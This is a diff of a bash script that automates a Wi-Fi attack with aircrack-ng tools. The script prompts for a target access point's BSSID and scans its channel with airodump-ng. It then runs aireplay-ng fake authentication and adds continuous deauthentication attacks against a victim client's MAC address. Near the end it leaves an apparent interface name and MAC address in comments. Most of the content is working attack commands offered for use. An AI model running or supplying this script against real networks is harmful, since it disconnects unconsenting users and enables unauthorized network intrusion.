@@ -90,7 +90,10 @@ else
         exit
     fi
 fi
+# terminal -e "airodump-ng $interface"
+# bash -c 'airodump-ng '$interface' ; bash'
 
+##  wifi_scanner.py should be used here
 
 
 echo "Enter the BSSID of the access point you want to attack"
@@ -125,10 +128,11 @@ fi
 
 # Scan the channel of the BSSID
 echo "Scanning channel $channel"
-airodump-ng $interface --bssid $assid --channel $channel
+
+# timeout 5s airodump-ng $interface --bssid $assid --channel $channel
 
 
-
+# TO VICTOR -> the bssid we want to attack is the 
 echo "Enter the BSSID you want to attack"
 read tarssid
 
@@ -145,7 +149,17 @@ fi
 
 # Fake an access point with assid as BSSID and channel as channel of the AP
 echo "Starting fake access point"
-aireplay-ng -1 0 -a $assid -h $tarssid $interface
+timeout 5s aireplay-ng -1 0 -a $assid -h $tarssid $interface
+
+#enter mac address of client we want to disconnect // example of aircrack-ng
+
+
+echo -e "\n\nEnter MAC address of victim"
+read client_mac
+
+# python3 deauth_pkts.py $ap_bssid $client_mac 20 $interface
+
+timeout 10s aireplay-ng --deauth 0 -c $client_mac -a $ap_bssid $interface
 
 
 
@@ -157,3 +171,6 @@ aireplay-ng -1 0 -a $assid -h $tarssid $interface
 echo "Deauthing target"
 aireplay-ng -0 0 -a $assid -h $tarssid $interface
 
+#   wlx6c5ab03ab2f5
+#   32:07:4D:4D:BD:1A
+#   11
